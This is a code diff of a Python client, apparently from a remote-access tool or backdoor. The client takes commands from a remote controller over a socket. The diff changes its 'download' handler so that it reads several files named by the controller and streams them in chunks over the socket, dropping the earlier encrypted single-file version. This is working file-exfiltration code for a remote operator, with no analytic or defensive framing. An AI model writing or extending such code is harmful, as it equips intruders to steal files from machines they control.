@@ -34,15 +34,29 @@ def main():
 
         # send file
         elif cmd == 'download':
-            f_name = action.split()[0]
+            
+            for fname in action.split():
+                fname = fname.strip()
+                
+                with open(fname, 'rb') as f:
+                    res = f.read(4096)
+                    while len(res):
+                        s.send(int_to_bytestring(len(res)))
+                        x = s.send(res)
+                        res = f.read(4096)
+                    s.send('\x00'); # EOF
+            
+            
+            
+            # f_name = action.split()[0]
 
-            f = open(f_name, 'rb')
-            results = f.read(1024)
-            while True:
-                s.send(encrypt(results, DHKEY))
-                results = f.read(1024)
-                if results == '':
-                    break
+            # f = open(f_name, 'rb')
+            # results = f.read(1024)
+            # while True:
+            #     s.send(encrypt(results, DHKEY))
+            #     results = f.read(1024)
+            #     if results == '':
+            #         break
                 
         # regenerate DH key (dangerous! may cause connection loss)
         # available in case a fallback occurs or you suspect evesdropping
